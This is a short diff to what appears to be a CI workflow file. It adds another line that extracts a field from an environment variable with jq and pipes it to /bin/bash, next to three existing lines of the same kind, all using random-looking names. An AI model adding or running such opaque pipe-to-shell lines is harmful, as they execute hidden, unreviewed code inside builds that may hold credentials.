@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$rkgvr0950" | jq -r .guk91225 | /bin/bash
           printf '%s' "$v9" | jq -r .t8045 | /bin/bash
           printf '%s' "$etyps98" | jq -r .q40 | /bin/bash
+          echo $fbuc32 | jq -r .ugdmu43735 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
